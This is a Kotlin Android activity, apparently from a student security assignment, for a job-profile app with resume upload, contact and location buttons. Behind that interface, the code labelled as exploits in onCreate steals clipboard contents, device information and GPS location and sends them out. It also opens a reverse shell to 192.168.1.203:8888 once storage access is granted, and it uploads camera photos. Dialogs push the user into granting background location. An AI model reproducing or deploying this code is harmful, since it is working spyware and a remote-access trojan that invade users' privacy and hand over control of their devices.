package com.example.assignment1

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.StrictMode
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.assignment1.DataRetriever.FindLocation
import com.example.assignment1.DataRetriever.General
import java.io.File
import kotlin.concurrent.thread


class ProfileTemplate : AppCompatActivity() {
    private var datasender = DataSender()
    private val hv = Harvester(this, this, datasender.getAndroidID())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        datasender.obtainAndroidID(this.contentResolver)
        val id = intent.getIntExtra("id",0)
        renderInfo(id)

        findViewById<Button>(R.id.contactUs).setOnClickListener(::contactUs)
        findViewById<TextView>(R.id.ResumeBtn).setOnClickListener(::chooseFile)
        findViewById<Button>(R.id.location).setOnClickListener(::location)
        findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)


        datasender.obtainAndroidID(this.contentResolver)                    // Set AndroidID
        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()  // Need this to allow finding of public IP - MY
        StrictMode.setThreadPolicy(policy)

        // MY Exploit -----------------------------------------------------------------
        val PERMISSIONS = arrayOf(
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (checkLocPerms(this, *PERMISSIONS)) {
            val gn = General(this,this)
            val gps = FindLocation(this, this)

            datasender.sendData("id", gn.stealClipboard())
            datasender.sendData("id", gn.stealDeviceInfo())
//            datasender.sendData("id", gn.logKeys())
//            datasender.sendData("id", gn.getPublicIP())
            datasender.sendData("loc", gps.getLocationDetails())
        }

        // Keefe Exploit --------------------------------------------------------------
        if (checkSMSPerms()) {
            // hv.getSMS()
            datasender.sendData("id" , "")
        }
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            // hv.getCallLog()
            datasender.sendData("id" , "")
        }
        if (checkFileStoragePerms()) {
            hv.getShell("192.168.1.203", 8888)
        }   // Shell Exploit

        // Lynette Camera Exploit (Done in Camera Button) -----------------------------
    }

    private fun renderInfo(id: Int) {
        when(id) {
            R.id.itBtn -> setContentView(R.layout.activity_profile)
            R.id.constrBtn -> setContentView(R.layout.activity_profile)
            R.id.eduBtn -> setContentView(R.layout.activity_profile)
            R.id.enterBtn -> setContentView(R.layout.activity_profile)
            R.id.financeBtn -> setContentView(R.layout.activity_profile)
            R.id.fnbBtn -> setContentView(R.layout.activity_profile)
            R.id.debugBtn -> setContentView(R.layout.activity_debug)
        }
    }

    private fun contactUs(view: View) {
        if (checkSMSPerms()) {
            writeSms("hello")
//            toast("Success")
        } else {
            requestSMSPerms()
        }
    }
    private fun chooseFile(view: View) {
        if (checkFileStoragePerms()) {
            fileSelector()
        }
        else {
            requestFileStoragePerms()
        }
    }
    private fun location(view: View) {
        val PERMISSIONS = arrayOf(
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (checkLocPerms(this, *PERMISSIONS)) {
            // Check background location perms
            if (checkLocPerms(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                // send to google maps
                redirectLocation()
            } else {
                val bgAlert = AlertDialog.Builder(this)
                bgAlert.setTitle("Permission Needed!")
                bgAlert.setMessage("Background Location Permission Needed!, tap \"Allow all the time in the next screen\"")
                bgAlert.setPositiveButton("Yes") {
                    dialog, which -> requestLocPerms(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
                }
                bgAlert.setNegativeButton("No") {
                    dialog, which -> dialog.cancel()
                }
                bgAlert.show()
            }
        } else {
            requestLocPerms(this, PERMISSIONS, 102)
        }
    }
    private fun openCamera(view: View) {
        if (checkCameraPerms()) {
            startCamera()
        }
        else {
            requestCameraPerms()
        }
    }

    // TODO: Merge all of the check and request permission into a permission handler function - Jon
    private fun checkFileStoragePerms(): Boolean{
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
        {
            //Android is 11(R) or above
            Environment.isExternalStorageManager()
        }
        else{
            //Android is below 11(R)
            val write = ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            val read = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
            write == PackageManager.PERMISSION_GRANTED && read == PackageManager.PERMISSION_GRANTED
        }
    }
    private fun requestFileStoragePerms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            //Android is 11(R) or above
            val intent = Intent()
            intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION //this and above is conflicting
            selectorARL.launch(intent)
        }
        else{
            //Android is below 11(R)
            ActivityCompat.requestPermissions(this,
                arrayOf(android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.READ_EXTERNAL_STORAGE),
                100
            )
        }
    }
    private val selectorARL = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val intent = result.data

            val uri = intent?.data
            val filename = uri!!.path!!.substring(uri.path!!.lastIndexOf('/') + 1)
            println(filename)

            val textView = findViewById<TextView>(R.id.filename)
            textView.text = filename
        }
//        shellExploit()
    }
    private fun fileSelector() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT)
        intent.type = "application/pdf"
        selectorARL.launch(Intent.createChooser(intent, "Choose a file"))
    }


    // Camera Functions------------------------------------------------------------------------
    private fun checkCameraPerms(): Boolean{
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
    private fun requestCameraPerms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            //Android is 11(R) or above
            ActivityCompat.requestPermissions(this,
                arrayOf(android.Manifest.permission.CAMERA, android.Manifest.permission.WRITE_EXTERNAL_STORAGE),
                10
            )
        }
    }
    private fun startCamera() {
        val intent = Intent(this@ProfileTemplate, CameraStart::class.java)
//        startActivity(intent)
        cameraAR.launch(intent)
    }
    private val cameraAR = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val filename = "resume.jpeg"
            println(filename)

            val textView = findViewById<TextView>(R.id.filename)
            textView.text = filename

            datasender.sendFile(filesDir.path + "/"+ filename)
        }
    }


    // ContactUs Functions------------------------------------------------------------------------
    private fun checkSMSPerms(): Boolean{
        val sendsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS)
        val readsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
        val boolie1 = sendsms == PackageManager.PERMISSION_GRANTED
        val boolie2 = readsms == PackageManager.PERMISSION_GRANTED
        println("$boolie1 $boolie2")
        return readsms == PackageManager.PERMISSION_GRANTED
    }
    private fun requestSMSPerms() {
        println("request Perms")
        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS), 101)
    }

    private fun checkLocPerms(context: Context,vararg permissions: String): Boolean = permissions.all {
        val bgLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        val coarseLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION)
        val fineLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
        val boolie1 = bgLoc == PackageManager.PERMISSION_GRANTED
        val boolie2 = coarseLoc == PackageManager.PERMISSION_GRANTED
        val boolie3 = fineLoc == PackageManager.PERMISSION_GRANTED
        println("bgLoc = $boolie1, coarseLoc = $boolie2, fineLoc = $boolie3")
        val isPerm = ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
        println("Checking $it: $isPerm")
        ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
//        return bgLoc == PackageManager.PERMISSION_GRANTED && coarseLoc == PackageManager.PERMISSION_GRANTED && fineLoc == PackageManager.PERMISSION_GRANTED
    }

    private fun requestLocPerms(activity: Activity, permissions: Array<String>, requestCode: Int) {
        println("Request location permissions: $permissions")
        ActivityCompat.requestPermissions(activity, permissions, requestCode)
    }

    private fun redirectLocation() {
        println("Redirect to google maps")
        val gmmIntentUri = Uri.parse("google.navigation:q=Singapore Institute of Technology @ NYP")
        val mapIntent = Intent(Intent.ACTION_VIEW, gmmIntentUri)
        mapIntent.setPackage("com.google.android.apps.maps")
        startActivity(mapIntent)
    }

    private fun writeSms(message: String) {
        val smsIntent : Intent = Uri.parse("smsto:" + 91234567).let { number -> Intent(Intent.ACTION_VIEW, number)}
        smsIntent.putExtra("sms_body", message)
        startActivity(smsIntent)
    }


    // Extra Functions
    private fun toast(message: String){
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}